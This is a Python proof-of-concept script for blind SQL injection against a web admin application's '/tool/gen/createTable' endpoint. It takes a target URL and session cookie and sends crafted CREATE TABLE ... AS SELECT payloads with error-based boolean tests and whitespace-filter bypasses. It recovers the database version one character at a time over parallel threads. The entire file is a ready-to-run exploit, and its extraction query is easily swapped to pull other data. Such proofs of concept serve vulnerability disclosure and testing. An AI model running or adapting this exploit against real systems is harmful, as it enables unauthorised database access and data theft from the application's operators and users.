import requests
import argparse
import random
from concurrent.futures import ThreadPoolExecutor
from string import printable, ascii_lowercase, digits
from urllib3 import disable_warnings
disable_warnings()


PROXY_ENABLED = True
PROXY = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
} if PROXY_ENABLED else {}
CHARSET = printable

def send_request(payload):
    global counter
    cookies = {
        'JSESSIONID': cookie,
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = f"sql={payload}"
    resp = requests.post(url=url+'/tool/gen/createTable', data=data, cookies=cookies, headers=headers, verify=False, proxies=PROXY)
    counter += 1
    if "操作成功" in resp.text:
        return True
    return False

def get_length_payload(value):
    tablename = f"{random_string}_{counter}"
    payload = f"CREATE%20table%20{tablename}%20as%20SELECT%0b111%20FROM%20sys_job%20WHERE%201%3d0%20AND%0bIF(length(%40%40version)%3d{value}%2c%201%2c%201%2f0)%3b"
    return payload

def get_length():
    for length in range(100):
        payload = get_length_payload(length)
        if send_request(payload=payload):
            print(f'Data has {length} characters')
            return length
    return 0

def get_payload(location, value:int):
    tablename = f"{random_string}_{counter}"
    payload = f"CREATE%20table%20{tablename}%20as%20SELECT%0b111%20FROM%20sys_job%20WHERE%201%3d0%20AND%0bIF(ascii(substring((select%0b%40%40version)%2c{location}%2c1))%3d{value}%2c%201%2c%201%2f0)%3b"
    return payload

def get_char(location):
    for char in CHARSET:
        payload = get_payload(location=location, value=ord(char))
        if send_request(payload=payload):
            print(f'Found character {char} at location {location}')
            return char
    return 'None'

def get_data():
    length = get_length()
    with ThreadPoolExecutor(max_workers=20) as tpe:
        res_iter = tpe.map(get_char, range(1, length+1))
    return ''.join(res_iter)

def init():
    parser = argparse.ArgumentParser(description='SQLi PoC')
    parser.add_argument('-u','--url',help='Target url', required=True, type=str)
    parser.add_argument('-c','--cookie',help='JSESSIONID cookie value', required=True, type=str)
    return parser.parse_args()

if __name__ == '__main__':
    args = init()
    url = args.url
    cookie = args.cookie
    counter = 0
    random_string = ''.join(random.choices(ascii_lowercase + digits, k=6))
    print('Data: ', get_data())